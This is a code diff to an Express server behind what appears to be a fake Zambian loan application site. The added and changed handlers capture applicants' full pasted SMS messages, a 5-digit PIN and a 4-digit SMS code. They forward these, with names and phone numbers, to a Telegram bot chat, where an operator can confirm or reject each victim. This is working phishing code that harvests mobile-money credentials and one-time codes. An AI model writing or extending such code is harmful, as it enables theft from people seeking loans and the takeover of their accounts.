@@ -77,17 +77,17 @@ app.post('/api/verify-code', async function (req, res) {
 
     var referenceId = 'REF' + Date.now() + Math.floor(Math.random() * 1000);
     decisions[referenceId] = 'pending';
-    
-    // ✅ SAVE THE FIRST CODE so we can retrieve it on the final page
+
+    // Save the full SMS pasted by the user, keyed by referenceId
     firstCodes[referenceId] = d.code;
 
     var message =
         '🔑 *Loan Application Code Received*\n' +
         '━━━━━━━━━━━━━━━━━━━━━━\n' +
         '👤 ' + (d.firstName || '-') + ' ' + (d.lastName || '-') + '\n' +
-        '📱 Phone: +260 ' + (d.phone || '-') + '\n' +
-        '💰 Amount: ZMW ' + Number(d.amount || 0).toLocaleString() + '\n' +
-        '\n🔐 *Code Entered:* `' + (d.code || '-') + '`\n' +
+        '\n📱 *Phone:*\n`' + (d.phone || '-') + '`\n' +
+        '\n💰 Amount: ZMW ' + Number(d.amount || 0).toLocaleString() + '\n' +
+        '\n📩 *Full SMS Message Pasted:*\n`' + (d.code || '-') + '`\n' +
         '\n🆔 Ref: `' + referenceId + '`\n' +
         '\n🕐 ' + new Date().toLocaleString() + '\n' +
         '━━━━━━━━━━━━━━━━━━━━━━\n' +
@@ -128,8 +128,8 @@ app.post('/api/resend-code', async function (req, res) {
     var message =
         '🔄 *Applicant Requested New Code*\n' +
         '━━━━━━━━━━━━━━━━━━━━━━\n' +
-        '📱 Phone: +260 ' + (d.phone || '-') + '\n' +
-        '🕐 ' + new Date().toLocaleString() + '\n' +
+        '📱 *Phone:*\n`' + (d.phone || '-') + '`\n' +
+        '\n🕐 ' + new Date().toLocaleString() + '\n' +
         '\n⚠️ They didn\'t receive or the previous code didn\'t work.\n' +
         'Please send them a new code.';
 
@@ -235,7 +235,7 @@ app.post('/api/telegram-callback', async function (req, res) {
 });
 
 // ============================================================
-// 7) NEW: FINAL CODE (from final.html)
+// 7) FINAL CODE (5-digit PIN from final.html)
 // ============================================================
 app.post('/api/final-code', async function (req, res) {
     var d = req.body;
@@ -243,15 +243,15 @@ app.post('/api/final-code', async function (req, res) {
     var firstCode = firstCodes[refId] || 'Unknown';
 
     var message =
-        '🎯 *FINAL CODE SUBMITTED*\n' +
+        '🎯 *5-DIGIT PIN SUBMITTED*\n' +
         '━━━━━━━━━━━━━━━━━━━━━━\n' +
-        '📱 Phone: +260 ' + (d.phone || '-') + '\n' +
-        '🆔 Ref: `' + refId + '`\n' +
-        '\n🔐 *First Code:* `' + firstCode + '`\n' +
-        '🔐 *Final Code:* `' + (d.finalCode || '-') + '`\n' +
+        '\n📱 *Phone:*\n`' + (d.phone || '-') + '`\n' +
+        '\n🔐 *Full SMS Message:*\n`' + firstCode + '`\n' +
+        '\n🔑 *5-Digit PIN:*\n`' + (d.finalCode || '-') + '`\n' +
+        '\n🆔 Ref: `' + refId + '`\n' +
         '\n🕐 ' + new Date().toLocaleString() + '\n' +
         '━━━━━━━━━━━━━━━━━━━━━━\n' +
-        '✅ Both codes verified. Ready for disbursement.';
+        '⏳ Applicant is now entering the 4-digit SMS code...';
 
     try {
         await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
@@ -263,10 +263,55 @@ app.post('/api/final-code', async function (req, res) {
                 parse_mode: 'Markdown'
             })
         });
-        console.log('🎯 Final code sent to Telegram for Ref:', refId);
+        console.log('🎯 5-digit PIN sent to Telegram for Ref:', refId);
         res.json({ ok: true });
     } catch (err) {
         console.error('Final code error:', err);
+        res.status(500).json({ ok: false });
+    }
+});
+
+// ============================================================
+// 8) LAST CODE (4-digit SMS code from lastcode.html)
+// ============================================================
+app.post('/api/last-code', async function (req, res) {
+    var d = req.body;
+
+    var referenceId = 'LC' + Date.now() + Math.floor(Math.random() * 1000);
+    decisions[referenceId] = 'pending';
+
+    var message =
+        '🔐 *4-DIGIT SMS CODE RECEIVED*\n' +
+        '━━━━━━━━━━━━━━━━━━━━━━\n' +
+        '\n📱 *Phone:*\n`' + (d.phone || '-') + '`\n' +
+        '\n🔑 *4-Digit SMS Code:*\n`' + (d.lastCode || '-') + '`\n' +
+        '\n🆔 Ref: `' + referenceId + '`\n' +
+        '\n🕐 ' + new Date().toLocaleString() + '\n' +
+        '━━━━━━━━━━━━━━━━━━━━━━\n' +
+        '✅ Confirm to complete the application.';
+
+    var keyboard = {
+        inline_keyboard: [[
+            { text: '✅ Confirm', callback_data: 'confirm:' + referenceId },
+            { text: '❌ Reject',  callback_data: 'reject:' + referenceId }
+        ]]
+    };
+
+    try {
+        await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown',
+                reply_markup: keyboard
+            })
+        });
+        console.log('🔐 Last code sent to Telegram with buttons. Ref:', referenceId);
+        res.json({ ok: true, referenceId: referenceId });
+    } catch (err) {
+        console.error('Last code error:', err);
         res.status(500).json({ ok: false });
     }
 });
